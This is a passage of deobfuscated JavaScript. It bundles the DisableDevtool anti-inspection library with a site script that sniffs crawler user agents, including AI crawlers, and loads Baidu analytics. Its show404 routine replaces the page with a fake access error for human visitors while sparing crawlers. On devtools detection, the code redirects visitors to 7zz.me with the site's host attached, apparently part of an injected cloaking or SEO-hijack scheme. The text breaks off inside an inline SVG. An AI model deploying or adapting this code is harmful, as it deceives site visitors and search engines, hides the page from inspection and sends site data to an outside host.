//Thu Jul 16 2026 00:04:58 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
!function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = "undefined" != typeof globalThis ? globalThis : e || self).DisableDevtool = t();
}(this, function () {
  "use strict";

  function o(e) {
    return (o = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    })(e);
  }
  function i(e, t) {
    if (!(e instanceof t)) {
      throw new TypeError("Cannot call a class as a function");
    }
  }
  function r(e, t) {
    for (var n = 0; n < t.length; n++) {
      var i = t[n];
      i.enumerable = i.enumerable || false;
      i.configurable = true;
      "value" in i && (i.writable = true);
      Object.defineProperty(e, i.key, i);
    }
  }
  function u(e, t, n) {
    t && r(e.prototype, t);
    n && r(e, n);
    Object.defineProperty(e, "prototype", {
      writable: false
    });
  }
  function e(e, t, n) {
    t in e ? Object.defineProperty(e, t, {
      value: n,
      enumerable: true,
      configurable: true,
      writable: true
    }) : e[t] = n;
  }
  function n(e, t) {
    if ("function" != typeof t && null !== t) {
      throw new TypeError("Super expression must either be null or a function");
    }
    e.prototype = Object.create(t && t.prototype, {
      constructor: {
        value: e,
        writable: true,
        configurable: true
      }
    });
    Object.defineProperty(e, "prototype", {
      writable: false
    });
    t && c(e, t);
  }
  function a(e) {
    return (a = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function (e) {
      return e.__proto__ || Object.getPrototypeOf(e);
    })(e);
  }
  function c(e, t) {
    return (c = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (e, t) {
      e.__proto__ = t;
      return e;
    })(e, t);
  }
  function U(e, t) {
    if (t && ("object" == typeof t || "function" == typeof t)) {
      return t;
    }
    if (undefined !== t) {
      throw new TypeError("Derived constructors may only return object or undefined");
    }
    t = e;
    if (undefined === t) {
      throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
    }
    return t;
  }
  function l(n) {
    var i = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) {
        return false;
      }
      if (Reflect.construct.sham) {
        return false;
      }
      if ("function" == typeof Proxy) {
        return true;
      }
      try {
        Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
        return true;
      } catch (e) {
        return false;
      }
    }();
    return function () {
      var e;
      var t = a(n);
      return U(this, i ? (e = a(this).constructor, Reflect.construct(t, arguments, e)) : t.apply(this, arguments));
    };
  }
  function f(e, t) {
    (null == t || t > e.length) && (t = e.length);
    for (var n = 0, i = new Array(t); n < t; n++) {
      i[n] = e[n];
    }
    return i;
  }
  function s(e, t) {
    var n;
    var i = "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
    if (!i) {
      if (Array.isArray(e) || (i = function (e, t) {
        if (e) {
          if ("string" == typeof e) {
            return f(e, t);
          }
          var n = Object.prototype.toString.call(e).slice(8, -1);
          return "Map" === (n = "Object" === n && e.constructor ? e.constructor.name : n) || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? f(e, t) : undefined;
        }
      }(e)) || t && e && "number" == typeof e.length) {
        i && (e = i);
        n = 0;
        return {
          s: t = function () {},
          n: function () {
            return n >= e.length ? {
              done: true
            } : {
              done: false,
              value: e[n++]
            };
          },
          e: function (e) {
            throw e;
          },
          f: t
        };
      }
      throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }
    var o;
    var r = true;
    var u = false;
    return {
      s: function () {
        i = i.call(e);
      },
      n: function () {
        var e = i.next();
        r = e.done;
        return e;
      },
      e: function (e) {
        u = true;
        o = e;
      },
      f: function () {
        try {
          r || null == i.return || i.return();
        } finally {
          if (u) {
            throw o;
          }
        }
      }
    };
  }
  var d = false;
  var t = {};
  function v(e) {
    t[e] = false;
  }
  function q() {
    for (var e in t) if (t[e]) {
      return d = true;
    }
    return d = false;
  }
  function h() {
    return new Date().getTime();
  }
  function z(e) {
    var t = h();
    e();
    return h() - t;
  }
  function B(n, i) {
    function e(t) {
      return function () {
        n && n();
        var e = t.apply(undefined, arguments);
        i && i();
        return e;
      };
    }
    var t = window.alert;
    var o = window.confirm;
    var r = window.prompt;
    try {
      window.alert = e(t);
      window.confirm = e(o);
      window.prompt = e(r);
    } catch (e) {}
  }
  var p = {
    iframe: false,
    pc: false,
    qqBrowser: false,
    firefox: false,
    macos: false,
    edge: false,
    oldEdge: false,
    ie: false,
    iosChrome: false,
    iosEdge: false,
    chrome: false,
    seoBot: false,
    mobile: false
  };
  function W() {
    function e(e) {
      return -1 !== t.indexOf(e);
    }
    var t = navigator.userAgent.toLowerCase();
    var n = function () {
      var e = navigator;
      var t = e.platform;
      var e = e.maxTouchPoints;
      if ("number" == typeof e) {
        return 1 < e;
      }
      if ("string" == typeof t) {
        e = t.toLowerCase();
        if (/(mac|win)/i.test(e)) {
          return false;
        }
        if (/(android|iphone|ipad|ipod|arch)/i.test(e)) {
          return true;
        }
      }
      return /(iphone|ipad|ipod|ios|android)/i.test(navigator.userAgent.toLowerCase());
    }();
    var i = !!window.top && window !== window.top;
    var o = !n;
    var r = e("qqbrowser");
    var u = e("firefox");
    var a = e("macintosh");
    var c = e("edge");
    var l = c && !e("chrome");
    var f = l || e("trident") || e("msie");
    var s = e("crios");
    var d = e("edgios");
    var v = e("chrome") || s;
    var h = !n && /(googlebot|baiduspider|bingbot|applebot|petalbot|yandexbot|bytespider|chrome\-lighthouse|moto g power)/i.test(t);
    Object.assign(p, {
      iframe: i,
      pc: o,
      qqBrowser: r,
      firefox: u,
      macos: a,
      edge: c,
      oldEdge: l,
      ie: f,
      iosChrome: s,
      iosEdge: d,
      chrome: v,
      seoBot: h,
      mobile: n
    });
  }
  function H() {
    for (var e = function () {
        for (var e = {}, t = 0; t < 500; t++) {
          e["".concat(t)] = "".concat(t);
        }
        return e;
      }(), t = [], n = 0; n < 50; n++) {
      t.push(e);
    }
    return t;
  }
  var y;
  var K = "";
  var V = false;
  function F() {
    var e = w.ignore;
    if (e) {
      if ("function" == typeof e) {
        return e();
      }
      if (0 !== e.length) {
        var t = location.href;
        if (K === t) {
          return V;
        }
        K = t;
        var n;
        var i = false;
        var o = s(e);
        try {
          for (o.s(); !(n = o.n()).done;) {
            var r = n.value;
            if ("string" == typeof r) {
              if (-1 !== t.indexOf(r)) {
                i = true;
                break;
              }
            } else {
              if (r.test(t)) {
                i = true;
                break;
              }
            }
          }
        } catch (e) {
          o.e(e);
        } finally {
          o.f();
        }
        return V = i;
      }
    }
  }
  (A = y = y || {})[A.Unknown = -1] = "Unknown";
  A[A.RegToString = 0] = "RegToString";
  A[A.DefineId = 1] = "DefineId";
  A[A.Size = 2] = "Size";
  A[A.DateToString = 3] = "DateToString";
  A[A.FuncToString = 4] = "FuncToString";
  A[A.Debugger = 5] = "Debugger";
  A[A.Performance = 6] = "Performance";
  A[A.DebugLib = 7] = "DebugLib";
  var b = function () {
    function n(e) {
      var t = e.type;
      var e = e.enabled;
      var e = undefined === e || e;
      i(this, n);
      this.type = y.Unknown;
      this.enabled = true;
      this.type = t;
      this.enabled = e;
      this.enabled && (t = this, $.push(t), this.init());
    }
    u(n, [{
      key: "onDevToolOpen",
      value: function () {
        var e;
        console.warn("You don't have permission to use DEVTOOL!【type = ".concat(this.type, "】"));
        w.clearIntervalWhenDevOpenTrigger && g();
        window.clearTimeout(N);
        w.ondevtoolopen(this.type, J);
        e = this.type;
        t[e] = true;
      }
    }, {
      key: "init",
      value: function () {}
    }]);
    return n;
  }();
  var M = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.DebugLib
      });
    }
    u(t, [{
      key: "init",
      value: function () {}
    }, {
      key: "detect",
      value: function () {
        var e;
        (true === (null == (e = null == (e = window.eruda) ? undefined : e._devTools) ? undefined : e._isShow) || window._vcOrigConsole && window.document.querySelector("#__vconsole.vc-toggle")) && this.onDevToolOpen();
      }
    }], [{
      key: "isUsing",
      value: function () {
        return !!window.eruda || !!window._vcOrigConsole;
      }
    }]);
    return t;
  }();
  var X = 0;
  var N = 0;
  var $ = [];
  var G = 0;
  function Y(o) {
    function e() {
      l = true;
    }
    function t() {
      l = false;
    }
    var n;
    var i;
    var r;
    var u;
    var a;
    var c;
    var l = false;
    function f() {
      (c[u] === r ? i : n)();
    }
    B(e, t);
    n = t;
    i = e;
    undefined !== (c = document).hidden ? (r = "hidden", a = "visibilitychange", u = "visibilityState") : undefined !== c.mozHidden ? (r = "mozHidden", a = "mozvisibilitychange", u = "mozVisibilityState") : undefined !== c.msHidden ? (r = "msHidden", a = "msvisibilitychange", u = "msVisibilityState") : undefined !== c.webkitHidden && (r = "webkitHidden", a = "webkitvisibilitychange", u = "webkitVisibilityState");
    c.removeEventListener(a, f, false);
    c.addEventListener(a, f, false);
    X = window.setInterval(function () {
      if (!(o.isSuspend || l || F())) {
        var e;
        var t;
        var n = s($);
        try {
          for (n.s(); !(e = n.n()).done;) {
            var i = e.value;
            v(i.type);
            i.detect(G++);
          }
        } catch (e) {
          n.e(e);
        } finally {
          n.f();
        }
        D();
        "function" == typeof w.ondevtoolclose && (t = d, !q() && t && w.ondevtoolclose());
      }
    }, w.interval);
    N = setTimeout(function () {
      p.pc || M.isUsing() || g();
    }, w.stopIntervalTime);
  }
  function g() {
    window.clearInterval(X);
  }
  function J() {
    if (g(), w.url) {
      window.location.href = w.url;
    } else {
      try {
        window.opener = null;
        window.open("", "_self");
        window.close();
        window.history.back();
      } catch (e) {
        console.log(e);
      }
      setTimeout(function () {
        window.location.href = w.timeOutUrl || "http://7zz.me?h=".concat(encodeURIComponent(location.host));
      }, 500);
    }
  }
  var w = {
    md5: "",
    ondevtoolopen: J,
    ondevtoolclose: null,
    url: "",
    timeOutUrl: "",
    tkName: "ddtk",
    interval: 500,
    disableMenu: true,
    stopIntervalTime: 5000,
    clearIntervalWhenDevOpenTrigger: false,
    detectors: [0, 1, 3, 4, 5, 6, 7],
    clearLog: true,
    disableSelect: false,
    disableCopy: false,
    disableCut: false,
    disablePaste: false,
    ignore: null,
    disableIframeParents: true,
    seo: true
  };
  var Q = ["detectors", "ondevtoolclose", "ignore"];
  function Z(e) {
    var t;
    var n = 0 < arguments.length && undefined !== e ? e : {};
    for (t in w) {
      var i = t;
      undefined === n[i] || o(w[i]) !== o(n[i]) && -1 === Q.indexOf(i) || (w[i] = n[i]);
    }
    "function" == typeof w.ondevtoolclose && true === w.clearIntervalWhenDevOpenTrigger && (w.clearIntervalWhenDevOpenTrigger = false, console.warn("【DISABLE-DEVTOOL】clearIntervalWhenDevOpenTrigger 在使用 ondevtoolclose 时无效"));
  }
  var m;
  var T;
  var ee;
  var O = window.console || {
    log: function () {},
    table: function () {},
    clear: function () {}
  };
  function D() {
    w.clearLog && ee();
  }
  var te = function () {
    return false;
  };
  function S(n) {
    var e;
    var i = 74;
    var o = 73;
    var r = 85;
    var u = 83;
    var a = 123;
    var c = p.macos ? function (e, t) {
      return e.metaKey && e.altKey && (t === o || t === i);
    } : function (e, t) {
      return e.ctrlKey && e.shiftKey && (t === o || t === i);
    };
    var l = p.macos ? function (e, t) {
      return e.metaKey && e.altKey && t === r || e.metaKey && t === u;
    } : function (e, t) {
      return e.ctrlKey && (t === u || t === r);
    };
    n.addEventListener("keydown", function (e) {
      var t = (e = e || n.event).keyCode || e.which;
      if (t === a || c(e, t) || l(e, t)) {
        return ne(n, e);
      }
    }, true);
    e = n;
    w.disableMenu && k(e, "contextmenu");
    e = n;
    w.disableSelect && k(e, "selectstart");
    e = n;
    w.disableCopy && k(e, "copy");
    e = n;
    w.disableCut && k(e, "cut");
    e = n;
    w.disablePaste && k(e, "paste");
  }
  function k(t, e) {
    t.addEventListener(e, function (e) {
      return ne(t, e);
    });
  }
  function ne(e, t) {
    if (!F() && !te()) {
      (t = t || e.event).returnValue = false;
      t.preventDefault();
      return false;
    }
  }
  var P = 8;
  function ie(e) {
    for (var t = function (e, t) {
        e[t >> 5] |= 128 << t % 32;
        e[14 + (t + 64 >>> 9 << 4)] = t;
        for (var n = 1732584193, i = -271733879, o = -1732584194, r = 271733878, u = 0; u < e.length; u += 16) {
          var a = n;
          var c = i;
          var l = o;
          var f = r;
          n = j(n, i, o, r, e[u + 0], 7, -680876936);
          r = j(r, n, i, o, e[u + 1], 12, -389564586);
          o = j(o, r, n, i, e[u + 2], 17, 606105819);
          i = j(i, o, r, n, e[u + 3], 22, -1044525330);
          n = j(n, i, o, r, e[u + 4], 7, -176418897);
          r = j(r, n, i, o, e[u + 5], 12, 1200080426);
          o = j(o, r, n, i, e[u + 6], 17, -1473231341);
          i = j(i, o, r, n, e[u + 7], 22, -45705983);
          n = j(n, i, o, r, e[u + 8], 7, 1770035416);
          r = j(r, n, i, o, e[u + 9], 12, -1958414417);
          o = j(o, r, n, i, e[u + 10], 17, -42063);
          i = j(i, o, r, n, e[u + 11], 22, -1990404162);
          n = j(n, i, o, r, e[u + 12], 7, 1804603682);
          r = j(r, n, i, o, e[u + 13], 12, -40341101);
          o = j(o, r, n, i, e[u + 14], 17, -1502002290);
          i = j(i, o, r, n, e[u + 15], 22, 1236535329);
          n = I(n, i, o, r, e[u + 1], 5, -165796510);
          r = I(r, n, i, o, e[u + 6], 9, -1069501632);
          o = I(o, r, n, i, e[u + 11], 14, 643717713);
          i = I(i, o, r, n, e[u + 0], 20, -373897302);
          n = I(n, i, o, r, e[u + 5], 5, -701558691);
          r = I(r, n, i, o, e[u + 10], 9, 38016083);
          o = I(o, r, n, i, e[u + 15], 14, -660478335);
          i = I(i, o, r, n, e[u + 4], 20, -405537848);
          n = I(n, i, o, r, e[u + 9], 5, 568446438);
          r = I(r, n, i, o, e[u + 14], 9, -1019803690);
          o = I(o, r, n, i, e[u + 3], 14, -187363961);
          i = I(i, o, r, n, e[u + 8], 20, 1163531501);
          n = I(n, i, o, r, e[u + 13], 5, -1444681467);
          r = I(r, n, i, o, e[u + 2], 9, -51403784);
          o = I(o, r, n, i, e[u + 7], 14, 1735328473);
          i = I(i, o, r, n, e[u + 12], 20, -1926607734);
          n = E(n, i, o, r, e[u + 5], 4, -378558);
          r = E(r, n, i, o, e[u + 8], 11, -2022574463);
          o = E(o, r, n, i, e[u + 11], 16, 1839030562);
          i = E(i, o, r, n, e[u + 14], 23, -35309556);
          n = E(n, i, o, r, e[u + 1], 4, -1530992060);
          r = E(r, n, i, o, e[u + 4], 11, 1272893353);
          o = E(o, r, n, i, e[u + 7], 16, -155497632);
          i = E(i, o, r, n, e[u + 10], 23, -1094730640);
          n = E(n, i, o, r, e[u + 13], 4, 681279174);
          r = E(r, n, i, o, e[u + 0], 11, -358537222);
          o = E(o, r, n, i, e[u + 3], 16, -722521979);
          i = E(i, o, r, n, e[u + 6], 23, 76029189);
          n = E(n, i, o, r, e[u + 9], 4, -640364487);
          r = E(r, n, i, o, e[u + 12], 11, -421815835);
          o = E(o, r, n, i, e[u + 15], 16, 530742520);
          i = E(i, o, r, n, e[u + 2], 23, -995338651);
          n = C(n, i, o, r, e[u + 0], 6, -198630844);
          r = C(r, n, i, o, e[u + 7], 10, 1126891415);
          o = C(o, r, n, i, e[u + 14], 15, -1416354905);
          i = C(i, o, r, n, e[u + 5], 21, -57434055);
          n = C(n, i, o, r, e[u + 12], 6, 1700485571);
          r = C(r, n, i, o, e[u + 3], 10, -1894986606);
          o = C(o, r, n, i, e[u + 10], 15, -1051523);
          i = C(i, o, r, n, e[u + 1], 21, -2054922799);
          n = C(n, i, o, r, e[u + 8], 6, 1873313359);
          r = C(r, n, i, o, e[u + 15], 10, -30611744);
          o = C(o, r, n, i, e[u + 6], 15, -1560198380);
          i = C(i, o, r, n, e[u + 13], 21, 1309151649);
          n = C(n, i, o, r, e[u + 4], 6, -145523070);
          r = C(r, n, i, o, e[u + 11], 10, -1120210379);
          o = C(o, r, n, i, e[u + 2], 15, 718787259);
          i = C(i, o, r, n, e[u + 9], 21, -343485551);
          n = _(n, a);
          i = _(i, c);
          o = _(o, l);
          r = _(r, f);
        }
        return Array(n, i, o, r);
      }(function (e) {
        for (var t = Array(), n = (1 << P) - 1, i = 0; i < e.length * P; i += P) {
          t[i >> 5] |= (e.charCodeAt(i / P) & n) << i % 32;
        }
        return t;
      }(e), e.length * P), n = "0123456789abcdef", i = "", o = 0; o < 4 * t.length; o++) {
      i += n.charAt(t[o >> 2] >> o % 4 * 8 + 4 & 15) + n.charAt(t[o >> 2] >> o % 4 * 8 & 15);
    }
    return i;
  }
  function x(e, t, n, i, o, r) {
    return _((t = _(_(t, e), _(i, r))) << o | t >>> 32 - o, n);
  }
  function j(e, t, n, i, o, r, u) {
    return x(t & n | ~t & i, e, t, o, r, u);
  }
  function I(e, t, n, i, o, r, u) {
    return x(t & i | n & ~i, e, t, o, r, u);
  }
  function E(e, t, n, i, o, r, u) {
    return x(t ^ n ^ i, e, t, o, r, u);
  }
  function C(e, t, n, i, o, r, u) {
    return x(n ^ (t | ~i), e, t, o, r, u);
  }
  function _(e, t) {
    var n = (65535 & e) + (65535 & t);
    return (e >> 16) + (t >> 16) + (n >> 16) << 16 | 65535 & n;
  }
  var A = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.RegToString,
        enabled: p.qqBrowser || p.firefox
      });
    }
    u(t, [{
      key: "init",
      value: function () {
        var t = this;
        this.lastTime = 0;
        this.reg = /./;
        m(this.reg);
        this.reg.toString = function () {
          var e;
          p.qqBrowser ? (e = new Date().getTime(), t.lastTime && e - t.lastTime < 100 ? t.onDevToolOpen() : t.lastTime = e) : p.firefox && t.onDevToolOpen();
          return "";
        };
      }
    }, {
      key: "detect",
      value: function () {
        m(this.reg);
      }
    }]);
    return t;
  }();
  var oe = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.DefineId
      });
    }
    u(t, [{
      key: "init",
      value: function () {
        var e = this;
        this.div = document.createElement("div");
        this.div.__defineGetter__("id", function () {
          e.onDevToolOpen();
        });
        Object.defineProperty(this.div, "id", {
          get: function () {
            e.onDevToolOpen();
          }
        });
      }
    }, {
      key: "detect",
      value: function () {
        m(this.div);
      }
    }]);
    return t;
  }();
  var re = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.Size,
        enabled: !p.iframe && !p.edge
      });
    }
    u(t, [{
      key: "init",
      value: function () {
        var e = this;
        this.checkWindowSizeUneven();
        window.addEventListener("resize", function () {
          setTimeout(function () {
            e.checkWindowSizeUneven();
          }, 100);
        }, true);
      }
    }, {
      key: "detect",
      value: function () {}
    }, {
      key: "checkWindowSizeUneven",
      value: function () {
        var e = function () {
          if (ue(window.devicePixelRatio)) {
            return window.devicePixelRatio;
          }
          var e = window.screen;
          return !(ue(e) || !e.deviceXDPI || !e.logicalXDPI) && e.deviceXDPI / e.logicalXDPI;
        }();
        if (false !== e) {
          var t = 200 < window.outerWidth - window.innerWidth * e;
          var e = 300 < window.outerHeight - window.innerHeight * e;
          if (t || e) {
            this.onDevToolOpen();
            return false;
          }
          v(this.type);
        }
        return true;
      }
    }]);
    return t;
  }();
  function ue(e) {
    return null != e;
  }
  var L;
  var ae = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.DateToString,
        enabled: !p.iosChrome && !p.iosEdge
      });
    }
    u(t, [{
      key: "init",
      value: function () {
        var e = this;
        this.count = 0;
        this.date = new Date();
        this.date.toString = function () {
          e.count++;
          return "";
        };
      }
    }, {
      key: "detect",
      value: function () {
        this.count = 0;
        m(this.date);
        D();
        2 <= this.count && this.onDevToolOpen();
      }
    }]);
    return t;
  }();
  var ce = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.FuncToString,
        enabled: !p.iosChrome && !p.iosEdge
      });
    }
    u(t, [{
      key: "init",
      value: function () {
        var e = this;
        this.count = 0;
        this.func = function () {};
        this.func.toString = function () {
          e.count++;
          return "";
        };
      }
    }, {
      key: "detect",
      value: function () {
        this.count = 0;
        m(this.func);
        D();
        2 <= this.count && this.onDevToolOpen();
      }
    }]);
    return t;
  }();
  var le = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.Debugger,
        enabled: p.iosChrome || p.iosEdge
      });
    }
    u(t, [{
      key: "detect",
      value: function () {
        var e = h();
        100 < h() - e && this.onDevToolOpen();
      }
    }]);
    return t;
  }();
  var fe = function () {
    n(t, b);
    var e = l(t);
    function t() {
      i(this, t);
      return e.call(this, {
        type: y.Performance,
        enabled: p.chrome || !p.mobile
      });
    }
    u(t, [{
      key: "init",
      value: function () {
        this.maxPrintTime = 0;
        this.largeObjectArray = H();
      }
    }, {
      key: "detect",
      value: function () {
        var e = this;
        var t = z(function () {
          T(e.largeObjectArray);
        });
        var n = z(function () {
          m(e.largeObjectArray);
        });
        if (this.maxPrintTime = Math.max(this.maxPrintTime, n), D(), 0 === t || 0 === this.maxPrintTime) {
          return false;
        }
        t > 10 * this.maxPrintTime && this.onDevToolOpen();
      }
    }]);
    return t;
  }();
  e(L = {}, y.RegToString, A);
  e(L, y.DefineId, oe);
  e(L, y.Size, re);
  e(L, y.DateToString, ae);
  e(L, y.FuncToString, ce);
  e(L, y.Debugger, le);
  e(L, y.Performance, fe);
  e(L, y.DebugLib, M);
  var se = L;
  var R = Object.assign(function (e) {
    function t() {
      var e = 0 < arguments.length && undefined !== arguments[0] ? arguments[0] : "";
      return {
        success: !e,
        reason: e
      };
    }
    if (R.isRunning) {
      return t("already running");
    }
    if (W(), ee = p.ie ? (m = function () {
      return O.log.apply(O, arguments);
    }, T = function () {
      return O.table.apply(O, arguments);
    }, function () {
      return O.clear();
    }) : (m = O.log, T = O.table, O.clear), Z(e), w.md5 && ie(function (e) {
      var t = window.location.search;
      var n = window.location.hash;
      if ("" !== (t = "" === t && "" !== n ? "?".concat(n.split("?")[1]) : t) && undefined !== t) {
        n = new RegExp("(^|&)" + e + "=([^&]*)(&|$)", "i");
        e = t.substr(1).match(n);
        if (null != e) {
          return unescape(e[2]);
        }
      }
      return "";
    }(w.tkName)) === w.md5) {
      return t("token passed");
    }
    if (w.seo && p.seoBot) {
      return t("seobot");
    }
    R.isRunning = true;
    Y(R);
    var n = R;
    te = function () {
      return n.isSuspend;
    };
    var i = window.top;
    var o = window.parent;
    if (S(window), w.disableIframeParents && i && o && i !== window) {
      for (; o !== i;) {
        S(o);
        o = o.parent;
      }
      S(i);
    }
    ("all" === w.detectors ? Object.keys(se) : w.detectors).forEach(function (e) {
      new se[e]();
    });
    return t();
  }, {
    isRunning: false,
    isSuspend: false,
    md5: ie,
    version: "0.3.6",
    DetectorType: y,
    isDevToolOpened: q
  });
  A = function () {
    if ("undefined" == typeof window || !window.document) {
      return null;
    }
    var n = document.querySelector("[disable-devtool-auto]");
    if (!n) {
      return null;
    }
    var i = ["disable-menu", "disable-select", "disable-copy", "disable-cut", "disable-paste", "clear-log"];
    var o = ["interval"];
    var r = {};
    ["md5", "url", "tk-name", "detectors"].concat(i, o).forEach(function (e) {
      var t = n.getAttribute(e);
      null !== t && (-1 !== o.indexOf(e) ? t = parseInt(t) : -1 !== i.indexOf(e) ? t = "false" !== t : "detector" === e && "all" !== t && (t = t.split(" ")), r[function (e) {
        if (-1 === e.indexOf("-")) {
          return e;
        }
        var t = false;
        return e.split("").map(function (e) {
          return "-" === e ? (t = true, "") : t ? (t = false, e.toUpperCase()) : e;
        }).join("");
      }(e)] = t);
    });
    return r;
  }();
  A && R(A);
  return R;
});
var curProtocol = window.location.protocol.split(":")[0];
var ishttp = "https:";
curProtocol === "https" && (ishttp = "https:");
var current_domain = document.domain;
var pc_system = {
  win: false,
  mac: false,
  xll: false
};
var platform = navigator.platform;
pc_system.win = platform.indexOf("Win") == 0;
pc_system.mac = platform.indexOf("Mac") == 0;
pc_system.x11 = platform == "X11" || platform.indexOf("Linux") == 0;
var ispc = false;
var ismobile = false;
if (pc_system.win || pc_system.mac || pc_system.xll) {
  ispc = true;
  document.URL.toLowerCase().indexOf("uu123") != -1;
} else {
  navigator.userAgent.toLowerCase().indexOf("mobile") != -1 && (ismobile = true);
}
var JKSite3 = new Object();
JKSite3.Cookie = {
  set: function (_0x4c21a2, _0x50356c, _0x39c227) {
    var _0x2a88cd = new Date(new Date().getTime() + 3600000);
    var _0x3c757b = "";
    document.cookie = _0x4c21a2 + "=" + _0x50356c + (_0x2a88cd ? "; expires=" + _0x2a88cd.toGMTString() : "") + (_0x39c227 ? "; path=" + _0x39c227 : "; path=/") + (_0x3c757b ? ";domain=" + _0x3c757b : "");
  },
  get: function (_0x1372d0) {
    var _0xf2ddcf = document.cookie.match(new RegExp("(^| )" + _0x1372d0 + "=([^;]*)(;|$)"));
    if (_0xf2ddcf != null) {
      return unescape(_0xf2ddcf[2]);
    }
    return null;
  }
};
function push_getUserAgent() {
  var _0x3510d5 = navigator.userAgent.toLowerCase();
  if (_0x3510d5.indexOf("baiduspider") != -1) {
    return "Baidu";
  }
  if (_0x3510d5.indexOf("googlebot") != -1) {
    return "Google";
  }
  if (_0x3510d5.indexOf("claudebot") != -1) {
    return "claude";
  }
  if (_0x3510d5.indexOf("applebot") != -1) {
    return "Apple";
  }
  if (_0x3510d5.indexOf("gptbot") != -1) {
    return "gptbot";
  }
  if (_0x3510d5.indexOf("360spider") != -1) {
    return "360";
  }
  if (_0x3510d5.indexOf("spider") != -1 && _0x3510d5.indexOf("sogou") != -1) {
    return "Sogou";
  }
  if (_0x3510d5.indexOf("bingbot") != -1 && _0x3510d5.indexOf("bingpreview") != -1 && _0x3510d5.indexOf("bingweb") != -1) {
    return "Bing";
  }
  if (_0x3510d5.indexOf("bytespider") != -1) {
    return "Byte";
  }
  if (_0x3510d5.indexOf("yisouspider") != -1) {
    return "Yisou";
  }
  if (_0x3510d5.indexOf("youdaobot") != -1) {
    return "Youdao";
  }
  if (_0x3510d5.indexOf("msnbot") != -1) {
    return "Msn";
  }
  if (_0x3510d5.indexOf("yahoo！slurp china") != -1) {
    return "Yahoo";
  }
  if (_0x3510d5.indexOf("dnspod-monitor") != -1) {
    return "DNSPod";
  }
  if (_0x3510d5.indexOf("mj12bot") != -1) {
    return "MJ12";
  }
  if (_0x3510d5.indexOf("semrushbot") != -1) {
    return "Semrush";
  }
  if (_0x3510d5.indexOf("aspiegelbot") != -1) {
    return "Aspiegel";
  }
  if (_0x3510d5.indexOf("yandexbot") != -1) {
    return "Yandex";
  }
  if (_0x3510d5.indexOf("ahrefsbot") != -1) {
    return "Ahrefs";
  }
  return "";
}
var is_spider = push_getUserAgent();
function showbaidu() {
  var _0xf74b32 = _0xf74b32 || [];
  (function () {
    var _0x36d8e3 = document.createElement("script");
    _0x36d8e3.src = "https://hm.baidu.com/hm.js?6845b966445890d2c051bc8104c7e372";
    var _0x2af6a6 = document.getElementsByTagName("script")[0];
    _0x2af6a6.parentNode.insertBefore(_0x36d8e3, _0x2af6a6);
  })();
}
function show404(_0x1bb7c1 = 0) {
  _is404 = true;
  if (document.domain == "7zz.me" || document.URL.toLowerCase().indexOf("uu123") != -1 || is_spider != "") {
    return;
  }
  showbaidu();
  var _0x5bbb94 = document.getElementsByTagName("head")[0];
  _0x5bbb94.innerHTML = "<meta charset=\"UTF-8\"><meta name=\"referrer\" content=\"no-referrer\"><title>网页无法访问</title>";
  var _0x30c580 = document.getElementsByTagName("body")[0];
  var _0x1a97af = "u=" + encodeURIComponent(document.URL) + "&ref=" + encodeURIComponent(document.referrer);
  var _0xd8f58a = "<style>html,body,div,ul,ol,li,p,h1,h2,h3,h4,h5,h6,form,table,input,button,td,img,tr,dl,dd,dt{margin:0;padding:0;border:0;}body{font-family:\"Segoe UI\",Arial,\"Microsoft Yahei\",sans-serif;font-size:14px;color:#666;background:#fff;}.center{box-sizing: border-box;font-size:1em;line-height:1.6em;margin:14vh auto 0;width:300px;background:#fff;position:fixed;z-index:9999999;top:0;left:50%; margin-left:-140px; }.bg {z-index:99999;background:#fff;position:fixed;width:100%;height:100%; top:0;left:0;}h2{color:#000;line-height:60px;font-size:24px;font-weight:500;}p{line-height:32px;}ul{padding-left:40px;}ul li{color:#1a73e8;line-height:24px;cursor:pointer;}span{display:block;line-height:32px;font-size:12px;}button{margin:51px 0 0;padding:8px 16px;background:#1a73e8;color:#fff; border-radius: 20px;font-size:1em;cursor:pointer;}</style><div class=\"center\"><div class=\"img\"><svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"56px\" height=\"68px\" viewBox=\"0 0 56 68\" enable-background=\"new 0 0 56 68\" xml:space=\"preserve\">  <image id=\"image0\" width=\"56\" height=\"68\" x=\"0\" y=\"0\"    